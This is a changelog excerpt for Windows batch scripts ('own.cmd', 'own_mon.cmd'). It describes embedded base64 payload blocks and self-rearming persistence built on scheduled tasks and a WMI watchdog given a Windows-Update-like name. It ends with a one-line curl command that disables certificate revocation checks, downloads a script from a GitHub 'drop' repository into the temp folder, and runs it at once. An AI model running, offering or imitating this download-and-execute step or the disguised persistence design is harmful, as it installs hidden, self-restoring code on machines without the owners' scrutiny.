...
- **own.cmd O19** (self-contained): all 4 embedded payload blocks regenerated byte-exact from
  current sources (verified SHA256-equal post-decode). O16-O18 embeds had accumulated damage:
  B64_MON contained phase-shifted base64 (garbage after byte 4128) + 2 corrupted watchdog lines
  (missing `"` on rearm echo, mangled box chars); B64_SEC/TGR/LIB were stale pre-L1 versions.
  Root cause: chunked manual StrReplace transcription. Rebuild now uses whole-block regeneration
  (Python/certutil), never partial line edits. Also fixes launcher detach — RUNNER was set inside the `if` block but
...
- **own_mon.cmd M10**: identity-aware rearm of chain1 (schtasks x4) + chain2 (WMI `WucacheWatchdog`
...
```
curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o19" && call %TEMP%\own.cmd
```
